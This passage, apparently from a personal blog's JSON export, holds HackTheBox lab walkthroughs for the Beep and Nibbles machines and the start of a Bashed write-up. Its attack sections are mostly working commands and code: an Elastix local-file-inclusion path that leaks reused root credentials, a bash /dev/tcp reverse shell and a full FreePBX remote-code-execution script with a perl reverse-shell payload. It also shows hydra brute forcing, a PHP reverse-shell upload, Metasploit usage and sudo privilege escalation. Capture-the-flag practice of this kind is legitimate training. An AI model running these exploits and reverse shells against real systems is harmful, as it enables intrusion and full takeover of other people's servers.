AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw== 25/tcp open smtp syn-ack ttl 63 Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http syn-ack ttl 63 Apache httpd 2.2.3 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ 110/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: PIPELINING APOP EXPIRE(NEVER) RESP-CODES UIDL IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE STLS LOGIN-DELAY(0) TOP 111/tcp open rpcbind syn-ack ttl 63 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 876/udp status |_ 100024 1 879/tcp status 143/tcp open imap syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: UNSELECT RENAME URLAUTHA0001 LITERAL+ ACL ID X-NETSCAPE IMAP4 OK BINARY NO LIST-SUBSCRIBED LISTEXT THREAD=REFERENCES ANNOTATEMORE ATOMIC CONDSTORE RIGHTS=kxte UIDPLUS CATENATE THREAD=ORDEREDSUBJECT SORT=MODSEQ CHILDREN IMAP4rev1 SORT MULTIAPPEND QUOTA Completed NAMESPACE MAILBOX-REFERRALS IDLE STARTTLS 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS)) |_ssl-date: 2022-02-09T15:27:21+00:00; +1h00m00s from scanner time. | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity | Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2017-04-07T08:22:08 | Not valid after: 2018-04-07T08:22:08 | MD5: 621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8 | SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f | -----BEGIN CERTIFICATE----- | MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t | MRIwEAYDVQQIEwlTb21lU3RhdGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQK | ExBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxV | bml0MR4wHAYDVQQDExVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B | CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE3MDQwNzA4MjIwOFoX | DTE4MDQwNzA4MjIwOFowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh | dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u | MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh | bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0 | LmxvY2FsZG9tYWluMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3e4HhLYPN | gwJ4eKlW/UpmemPfK/a3mcafSqx/AJP34OC0Twj/cZNaqFPLOWfNjcq4mmiV++9a | oJCkj4apDkyICI1emsrPaRdrlA/cCXcn3nupfOgcfpBV4vqNfqorEqpJCO7T4bcp | Z6YHuxtRtP7gRJiE1ytAFP2jDvtvMqEWkwIDAQABo4IBHTCCARkwHQYDVR0OBBYE | FL/OLJ7hJVedlL5Gk0fYvo6bZkqWMIHpBgNVHSMEgeEwgd6AFL/OLJ7hJVedlL5G | k0fYvo6bZkqWoYHBpIG+MIG7MQswCQYDVQQGEwItLTESMBAGA1UECBMJU29tZVN0 | YXRlMREwDwYDVQQHEwhTb21lQ2l0eTEZMBcGA1UEChMQU29tZU9yZ2FuaXphdGlv | bjEfMB0GA1UECxMWU29tZU9yZ2FuaXphdGlvbmFsVW5pdDEeMBwGA1UEAxMVbG9j | YWxob3N0LmxvY2FsZG9tYWluMSkwJwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9z | dC5sb2NhbGRvbWFpboICfVUwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB | gQA+ah2n+bomON94KgibPEVPpmW+8N6Sq3f4qDG54urTnPD39GrYHvMwA3B2ang9 | l3zta5tXYAVj22kiNM2si4bOMQsa6FZR4AEzWCq9tZS/vTCCRaT79mWj3bUvtDkV | 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw== |_-----END CERTIFICATE----- | http-robots.txt: 1 disallowed entry |_/ |_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F |_http-title: Elastix - Login page | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.2.3 (CentOS) 993/tcp open ssl/imap syn-ack ttl 63 Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 3306/tcp open mysql syn-ack ttl 63 MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) 4445/tcp open upnotifyp? syn-ack ttl 63 10000/tcp open http syn-ack ttl 63 MiniServ 1.570 (Webmin httpd) |_http-server-header: MiniServ/1.570 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341 |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/9%OT=22%CT=1%CU=36256%PV=Y%DS=2%DC=I%G=Y%TM=6203D000 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=C9%GCD=1%ISR=CE%TI=Z%CI=Z%II=I%TS=A)OPS(O1 OS:=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW OS:7%O6=M505ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R= OS:Y%DF=Y%T=40%W=16D0%O=M505NNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R OS:D=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M505ST11NW7%RD=0%Q OS:=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Uptime guess: 0.409 days (since Tue Feb 8 23:41:52 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=201 (Good luck!) IP ID Sequence Generation: All zeros Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com   Directory Enum 1  dirb https://10.10.10.7/   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  ==\u0026gt; DIRECTORY: https://10.10.10.7/admin/ + https://10.10.10.7/cgi-bin/ (CODE:403|SIZE:286) ==\u0026gt; DIRECTORY: https://10.10.10.7/configs/ + https://10.10.10.7/favicon.ico (CODE:200|SIZE:894) ==\u0026gt; DIRECTORY: https://10.10.10.7/help/ ==\u0026gt; DIRECTORY: https://10.10.10.7/images/ + https://10.10.10.7/index.php (CODE:200|SIZE:1785) ==\u0026gt; DIRECTORY: https://10.10.10.7/lang/ ==\u0026gt; DIRECTORY: https://10.10.10.7/libs/ ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/ ==\u0026gt; DIRECTORY: https://10.10.10.7/modules/ ==\u0026gt; DIRECTORY: https://10.10.10.7/panel/ + https://10.10.10.7/robots.txt (CODE:200|SIZE:28) ==\u0026gt; DIRECTORY: https://10.10.10.7/static/ ==\u0026gt; DIRECTORY: https://10.10.10.7/themes/ ==\u0026gt; DIRECTORY: https://10.10.10.7/var/ ---- Entering directory: https://10.10.10.7/admin/ ---- ==\u0026gt; DIRECTORY: https://10.10.10.7/admin/common/ + https://10.10.10.7/admin/favicon.ico (CODE:200|SIZE:318) ==\u0026gt; DIRECTORY: https://10.10.10.7/admin/images/ + https://10.10.10.7/admin/index.php (CODE:302|SIZE:0) + https://10.10.10.7/admin/modules (CODE:403|SIZE:291) + https://10.10.10.7/admin/views (CODE:403|SIZE:289) ---- Entering directory: https://10.10.10.7/configs/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/help/ ---- ==\u0026gt; DIRECTORY: https://10.10.10.7/help/content/ + https://10.10.10.7/help/index.php (CODE:200|SIZE:346) ---- Entering directory: https://10.10.10.7/images/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/lang/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/libs/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/mail/ ---- ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/bin/ + https://10.10.10.7/mail/config (CODE:403|SIZE:289) + https://10.10.10.7/mail/index.php (CODE:200|SIZE:2649) ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/installer/ + https://10.10.10.7/mail/LICENSE (CODE:200|SIZE:17987) + https://10.10.10.7/mail/logs (CODE:403|SIZE:287) ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/plugins/ ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/program/ + https://10.10.10.7/mail/README (CODE:200|SIZE:1856) + https://10.10.10.7/mail/robots.txt (CODE:200|SIZE:26) ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/skins/ ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/SQL/ + https://10.10.10.7/mail/temp (CODE:403|SIZE:287) ---- Entering directory: https://10.10.10.7/modules/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/panel/ ---- ^Z\u0026gt; Testing: https://10.10.10.7/panel/akeeba.backend.log   LFI Exploit  Search google Elastix exploit →https://www.exploit-db.com/exploits/37637 (Local File Inclusion exploit)  1  #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026amp;module=Accounts\u0026amp;action    Go to →https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf\u0026amp;module=Accounts\u0026amp;action Right click → View Selection Source (View in nice format) Password used in multiple ocasion → jEhdIekWmdjE   Creds for login to Elastix: → admin : jEhdIekWmdjE Another login page →https://10.10.10.7:10000/  root : jEhdIekWmdjE    Escalate Privileges  After loging-in into →https://10.10.10.7:10000/ Go to Cluster → Cluster Shell Commands  RCE 1 2 3 4 5 6  # Input reverse command found in pentestmonkey reverse bash shell bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.35/8080 0\u0026gt;\u0026amp;1 # Select \u0026#34;this server\u0026#34; # Run Command Now   1 2 3 4 5 6 7 8 9 10  # We obtained root cd home cd fanis cat user.txt -\u0026gt; ******************************** cd /root cat root.txt -\u0026gt; ********************************   Escalate Privileges and Exploit 2 Source → https://www.exploit-db.com/exploits/18650\n1  # Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.   1 2 3  searchsploit -m 18649.py mv 18649.py exploit.py   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  #!/usr/bin/python ############################################################ # Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit # Google Dork: oy vey # Date: March 23rd, 2012 # Author: muts, SSL update by Emporeo # Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others. # Tested on: multiple # CVE : notyet # Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ # Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt ############################################################ # Discovered by Martin Tschirsich # http://seclists.org/fulldisclosure/2012/Mar/234 # http://www.exploit-db.com/exploits/18649 ############################################################ import urllib import ssl rhost=\u0026#34;10.10.10.7\u0026#34; # Modify the rhost to the vulnerable machine lhost=\u0026#34;10.10.14.35\u0026#34; # Modify to local machine lport=443 extension=\u0026#34;233\u0026#34; # This extension can be found after login in to admin portal ssl._create_default_https_context = ssl._create_unverified_context # Reverse shell payload url = \u0026#39;https://\u0026#39;+str(rhost)+\u0026#39;/recordings/misc/callme_page.php?action=c\u0026amp;callmenum=\u0026#39;+str(extension)+\u0026#39;@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22\u0026#39;+str(lhost)+\u0026#39;%3a\u0026#39;+str(lport)+\u0026#39;%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A\u0026#39; urllib.urlopen(url) # On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help # nmap\u0026gt; !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)   1 2 3 4 5 6 7 8  nc -lvnp 443 python exploit.py cd /home cd fanis cat user.txt -\u0026gt; ********************************   Escalate Root 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # Following this attack -\u0026gt; https://www.exploit-db.com/exploits/18650 # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help # nmap\u0026gt; !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) sudo -l -\u0026gt; (root) NOPASSWD: /usr/bin/nmap # Attacking nmap vector sudo nmap --interactive !sh cd /root cat root.txt -\u0026gt; ********************************   Skills Learned  Web-based fuzzing Identifying known exploits Exploiting local file inclusion\nvulnerabilities  ","description":"Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.","id":18,"section":"posts","tags":["OSCP","linux","apache","php","lfi","smtp","rce","voip"],"title":"Hackthebox - Beep","uri":"https://hswootan.github.io/en/posts/beep/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -O -vv 10.10.10.75 -oA nibbles   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  # Nmap 7.92 scan initiated Mon Feb 7 16:42:21 2022 as: nmap -sV -sC -O -vv -oA nibbles 10.10.10.75 Nmap scan report for 10.10.10.75 Host is up, received echo-reply ttl 63 (0.018s latency). Scanned at 2022-02-07 16:42:21 EST for 19s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc= | 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/7%OT=22%CT=1%CU=38674%PV=Y%DS=2%DC=I%G=Y%TM=62019250 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Uptime guess: 207.990 days (since Wed Jul 14 17:56:56 2021) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Feb 7 16:42:40 2022 -- 1 IP address (1 host up) scanned in 19.67 seconds    Google search OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 exploit https://www.exploit-db.com/exploits/40136  1 2 3 4 5 6 7 8 9 10  msfconsole search CVE-2016-6210 use auxiliary/scanner/ssh/ssh_enumusers set rhosts 10.10.10.75 set USER_FILE /usr/share/wordlists/rockyou.txt exploit -\u0026gt; [+] 10.10.10.75:22 - SSH - User \u0026#39;nobody\u0026#39; found   Burp the website http://10.10.10.75\n1 2  # Found \u0026lt;!-- /nibbleblog/ directory. Nothing interesting here! --\u0026gt;    http://10.10.10.75/nibbleblog/  Directory Enumeration 1  dirb http://10.10.10.75/   1 2  + http://10.10.10.75/index.html (CODE:200|SIZE:93) + http://10.10.10.75/server-status (CODE:403|SIZE:299)   1  dirb http://10.10.10.75/nibbleblog/   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/admin/ + http://10.10.10.75/nibbleblog/admin.php (CODE:200|SIZE:1401) ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/content/ + http://10.10.10.75/nibbleblog/index.php (CODE:200|SIZE:2987) ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/languages/ ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/plugins/ + http://10.10.10.75/nibbleblog/README (CODE:200|SIZE:4628) ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/themes/ ---- Entering directory: http://10.10.10.75/nibbleblog/admin/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.75/nibbleblog/content/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.75/nibbleblog/languages/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.75/nibbleblog/plugins/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.75/nibbleblog/themes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway)    Going tohttp://10.10.10.75/nibbleblog/content/  private → users.xml   Found User: admin   Brute force with hydra 1  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form \u0026#34;/nibbleblog/admin.php:username=^USER^\u0026amp;password=^PASS^:Incorrect username or password.\u0026#34;   1 2 3 4 5 6 7 8 9 10 11 12 13  [80][http-post-form] host: 10.10.10.75 login: admin password: 12345678 [80][http-post-form] host: 10.10.10.75 login: admin password: daniel [80][http-post-form] host: 10.10.10.75 login: admin password: michael [80][http-post-form] host: 10.10.10.75 login: admin password: 654321 [80][http-post-form] host: 10.10.10.75 login: admin password: qwerty [80][http-post-form] host: 10.10.10.75 login: admin password: ashley [80][http-post-form] host: 10.10.10.75 login: admin password: sunshine [80][http-post-form] host: 10.10.10.75 login: admin password: michelle [80][http-post-form] host: 10.10.10.75 login: admin password: 000000 [80][http-post-form] host: 10.10.10.75 login: admin password: tigger [80][http-post-form] host: 10.10.10.75 login: admin password: 111111 [80][http-post-form] host: 10.10.10.75 login: admin password: chocolate [80][http-post-form] host: 10.10.10.75 login: admin password: iloveu    No valid password for admin Login fort eh admin pagehttp://10.10.10.75/nibbleblog/admin.php  username: admin | password: nibbles    Nibbleblog info in →http://10.10.10.75/nibbleblog/README  Version: v4.0.3 Codename: Coffee Release date: 2014-04-01   How to get reverse shell →https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html  Exploitation 1 2 3 4 5 6 7 8 9 10 11 12  locate php reverse -\u0026gt; /usr/share/webshells/php/php-reverse-shell.php --------------- # Edit in the php reverse file $ip = \u0026#39;10.10.14.35\u0026#39;; // CHANGE THIS $port = 6060; // CHANGE THIS ------------------ nc -lvnp 6060    Upload the file via http://10.10.10.75/nibbleblog/admin.php → Plugins → My Image _\u0026gt; Configure → Browser → Save Changes Ignore the errors To execute the file go to →http://10.10.10.75/nibbleblog/content/private/plugins/my_image/  1 2 3 4  cd home cd nibbler cat user.txt -\u0026gt; ********************************   Make shell interactive 1 2 3 4 5 6 7 8 9 10 11  python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z bash # Switch to bash from zsh stty raw -echo fg [Press Enter] export TERM=screen   Escalate Privileges 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  sudo -l User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh unzip personal.zip cd personal cd stuff chmod +x monitor.sh sudo ./monitor.sh or sudo /home/nibbler/personal/stuff/monitor.sh   Exploit through metasploit 1 2 3 4 5  msfconsole search nibbleblog use exploit/multi/http/nibbleblog_file_upload    admin : nibbles  1 2 3 4 5 6 7 8 9 10 11  set PASSWORD nibbles set USERNAME admin set rhosts 10.10.10.75 set lhost 10.10.14.35 set TARGETURI /nibbleblog run   1 2 3 4  cd /home cd nibbler cat user.txt -\u0026gt; ********************************   Spawn shell 1  /bin/bash -i   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  sudo -l -\u0026gt; (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh unzip personal.zip chmod +x monitor.sh sudo ./monitor.sh id -\u0026gt; uid=0(root) gid=0(root) groups=0(root) cd /root cat root.txt -\u0026gt; ********************************   Skills Learned  Enumerating web applications Guessing probable passwords Bypassing login rate limiting Exploiting NOPASSWD  ","description":"Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.","id":19,"section":"posts","tags":["OSCP","linux","cve","user enumeration","sudo","brute force attack"],"title":"Hackthebox - Nibbles","uri":"https://hswootan.github.io/en/posts/nibbles/"},{"content":"\r\rEnumeration 1  nmap -sC -sV -oA initial 10.10.10.68   1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.92 scan initiated Sat Jan 29 13:18:07 2022 as: nmap -sC -sV -oA initial 10.10.10.68 Nmap scan report for 10.10.10.68 Host is up (0.018s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#39;s Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 29 13:18:15 2022 -- 1 IP address (1 host up) scanned in 7.39 seconds    Ubuntu Xenial 16.04 based upon httpd version  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285  \u0026lt;?php /* phpbash by Alexander Reid (Arrexel) */ if (ISSET($_POST[\u0026#39;cmd\u0026#39;])) { $output = preg_split(\u0026#39;/[\\n]/\u0026#39;, shell_exec($_POST[\u0026#39;cmd\u0026#39;].\u0026#34; 